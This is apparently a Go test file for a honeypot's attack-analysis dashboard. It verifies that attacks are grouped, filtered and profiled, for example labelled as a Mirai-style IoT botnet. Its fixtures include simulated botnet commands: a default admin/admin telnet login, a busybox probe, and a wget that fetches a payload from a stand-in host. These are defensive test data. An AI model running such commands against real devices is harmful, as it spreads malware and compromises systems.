package main

import (
	"encoding/json"
	"net/http/httptest"
	"net/url"
	"strconv"
	"strings"
	"testing"
	"time"
)

// Jeder Wert der Feldstatistik trägt einen Suchbegriff, der genau die Angriffe mit diesem Wert trifft.
func TestOverviewQueriesMatch(t *testing.T) {
	mirai := attackOf(sessEv(loginEv("telnet", "admin", "admin", map[string]any{"success": true}), "o1"),
		sessEv(svcCmd("telnet", "/bin/busybox HISILICON"), "o1"), sessEv(svcCmd("telnet", `echo -e "\x47\x41\x59\x46\x47\x54"`), "o1"),
		sessEv(svcCmd("telnet", "wget http://198.51.100.20/x86_64 -O q"), "o1"))
	mirai.Country, mirai.ASN = "DE", 64500
	brute := attackOf(loginEv("ssh", "root", "123456", nil), loginEv("ssh", "root", "admin", nil))
	brute.Country, brute.ASN = "NL", 64501
	o := newOverview(0, 1)
	for _, a := range []*Attack{mirai, brute} {
		o.addFields(a)
	}
	o.finish()
	if len(o.Fields) < 6 {
		t.Fatalf("Felder: %+v", o.Fields)
	}
	for _, f := range o.Fields {
		for _, v := range f.Top {
			terms := parseQuery(v.Query)
			got := 0
			for _, a := range []*Attack{mirai, brute} {
				if a.matchQuery(terms) {
					got++
				}
			}
			if got != v.N {
				t.Errorf("%s %q: Suchbegriff %q trifft %d statt %d", f.Key, v.Value, v.Query, got, v.N)
			}
		}
	}
}

// /api/attacks?overview=1: Verlauf ohne Stufen- und Zeitfilter, Trichter ohne Stufenfilter,
// Zeitfenster from/to grenzt die Liste ein.
func TestAttacksOverviewAndTimeWindow(t *testing.T) {
	h := testHive(t)
	w, wait := testWriter(t, h.st)
	now := time.Now()
	old := now.Add(-5 * time.Hour)
	for _, e := range []*Event{
		evAt(old, "connect", "telnet", "203.0.113.40", 23, nil),
		evAt(now.Add(-10*time.Minute), "login", "ssh", "203.0.113.41", 22, map[string]any{"success": false}),
		evAt(now.Add(-9*time.Minute), "connect", "redis", "203.0.113.42", 6379, nil),
	} {
		w.Submit(e)
	}
	wait()
	get := func(q string) (r struct {
		Attacks  []*Attack
		Matched  int
		Overview *attackOverview
	}) {
		rec := httptest.NewRecorder()
		h.attacks(rec, httptest.NewRequest("GET", "/api/attacks?range=24h&overview=1&"+q, nil))
		json.Unmarshal(rec.Body.Bytes(), &r)
		return
	}
	all := get("")
	if all.Matched != 3 || all.Overview == nil || len(all.Overview.Hist) != overviewBuckets || all.Overview.Stufen[0] != 2 || all.Overview.Stufen[1] != 1 {
		t.Fatalf("%+v %+v", all.Matched, all.Overview)
	}
	from := now.Add(-time.Hour).UnixMilli()
	win := get("from=" + strconv.FormatInt(from, 10) + "&stufe=0")
	if win.Matched != 1 || win.Attacks[0].IP != "203.0.113.42" {
		t.Errorf("Zeitfenster: %d %+v", win.Matched, win.Attacks)
	}
	hist := 0
	for _, b := range win.Overview.Hist {
		for _, n := range b {
			hist += n
		}
	}
	if hist != 3 || win.Overview.Stufen[1] != 1 {
		t.Errorf("Verlauf %d, Stufen %v", hist, win.Overview.Stufen)
	}
}

// Sitzungen und Ereignisse teilen die Filter der Seite "Angriffe" (attackfilter.go).
func TestSessionsAndEventsSharedFilter(t *testing.T) {
	h := testHive(t)
	w, wait := testWriter(t, h.st)
	now := time.Now().Add(-20 * time.Minute)
	ev := func(d time.Duration, typ, svc, ip, sess string, data map[string]any) *Event {
		e := evAt(now.Add(d), typ, svc, ip, 23, data)
		e.Session = sess
		return e
	}
	for _, e := range []*Event{
		ev(0, "connect", "telnet", "203.0.113.50", "m1", nil),
		ev(time.Second, "login", "telnet", "203.0.113.50", "m1", map[string]any{"success": true}),
		ev(2*time.Second, "command", "telnet", "203.0.113.50", "m1", map[string]any{"input": "/bin/busybox HISILICON"}),
		ev(3*time.Second, "connect", "ssh", "198.51.100.60", "b1", nil),
		ev(4*time.Second, "login", "ssh", "198.51.100.60", "b1", map[string]any{"success": false}),
	} {
		w.Submit(e)
	}
	wait()
	get := func(path string, v any) {
		rec := httptest.NewRecorder()
		req := httptest.NewRequest("GET", path, nil)
		if strings.HasPrefix(path, "/api/sessions") {
			h.sessionsList(rec, req)
		} else {
			h.events(rec, req)
		}
		if err := json.Unmarshal(rec.Body.Bytes(), v); err != nil {
			t.Fatalf("%s: %v %s", path, err, rec.Body.String())
		}
	}
	var all, bot []map[string]any
	get("/api/sessions?range=24h", &all)
	get("/api/sessions?range=24h&stufe=3", &bot)
	if len(all) != 2 || len(bot) != 1 || bot[0]["session"] != "m1" || bot[0]["profile"] != "IoT-Botnetz (Mirai-Art)" {
		t.Fatalf("Sitzungen: %v / %v", all, bot)
	}
	if c, _ := bot[0]["cmds"].([]any); len(c) != 1 {
		t.Errorf("Befehle: %v", bot[0]["cmds"])
	}
	var evs []map[string]any
	get("/api/events?range=24h&aq="+url.QueryEscape(`tag="iot_botnet"`), &evs)
	if len(evs) != 3 {
		t.Errorf("Ereignisse mit Suchbegriff: %d", len(evs))
	}
	for _, e := range evs {
		if e["src_ip"] != "203.0.113.50" {
			t.Errorf("falsche IP: %v", e["src_ip"])
		}
	}
	get("/api/events?range=24h&stufe=1", &evs)
	if len(evs) != 2 {
		t.Errorf("Ereignisse mit Stufe: %d", len(evs))
	}
}

// Mehr als 50 Sitzungen eines Angriffs: auch die nicht gemerkten Sitzungen bekommen ihren Angriff.
func TestSessionsBeyondAttackLimit(t *testing.T) {
	h := testHive(t)
	w, wait := testWriter(t, h.st)
	now := time.Now().Add(-30 * time.Minute)
	for i := range 60 {
		sess := "s" + strconv.Itoa(i)
		for j, typ := range []string{"connect", "login"} {
			e := evAt(now.Add(time.Duration(i*10+j)*time.Second), typ, "ssh", "198.51.100.77", 22, map[string]any{"success": false})
			e.Session = sess
			w.Submit(e)
		}
	}
	wait()
	for _, q := range []string{"/api/sessions?range=24h&limit=1000", "/api/sessions?range=24h&limit=1000&stufe=1"} {
		rec := httptest.NewRecorder()
		h.sessionsList(rec, httptest.NewRequest("GET", q, nil))
		var rows []map[string]any
		json.Unmarshal(rec.Body.Bytes(), &rows)
		if len(rows) != 60 {
			t.Fatalf("%s: %d Sitzungen", q, len(rows))
		}
		for _, r := range rows {
			if r["attack"] == nil || r["profile"] == nil {
				t.Fatalf("%s: Sitzung %v ohne Angriff", q, r["session"])
			}
		}
	}
}

// Angreifer-Seite: Ports aus allen Ereignissen, „Befehle“ wie auf den Angriffskarten (Live-Check 0.9.6).
func TestAttackerPortsAndCommands(t *testing.T) {
	h := testHive(t)
	w, wait := testWriter(t, h.st)
	now := time.Now().Add(-10 * time.Minute)
	ev := func(d time.Duration, typ, svc string, port int, sess string, data map[string]any) {
		e := evAt(now.Add(d), typ, svc, "203.0.113.159", port, data)
		e.Session = sess
		w.Submit(e)
	}
	ev(0, "connect", "telnet", 23, "t1", nil)
	ev(time.Second, "login", "telnet", 23, "t1", map[string]any{"success": true})
	ev(2*time.Second, "command", "telnet", 23, "t1", map[string]any{"input": "uname -a"})
	ev(3*time.Second, "command", "telnet", 23, "t1", map[string]any{"input": ""}) // nur Enter
	ev(4*time.Second, "login", "ssh", 22, "s1", map[string]any{"success": false}) // SSH ohne connect-Ereignis
	wait()
	rec := httptest.NewRecorder()
	req := httptest.NewRequest("GET", "/api/attackers/203.0.113.159", nil)
	req.SetPathValue("ip", "203.0.113.159")
	h.attacker(rec, req)
	var d struct {
		Info  map[string]any   `json:"info"`
		Ports []map[string]any `json:"ports"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &d); err != nil {
		t.Fatal(err, rec.Body.String())
	}
	if len(d.Ports) != 2 {
		t.Errorf("Ports: %v", d.Ports)
	}
	if d.Info["commands"] != float64(1) || d.Info["commands_all"] != float64(2) {
		t.Errorf("Befehle: %v (alle %v)", d.Info["commands"], d.Info["commands_all"])
	}
}
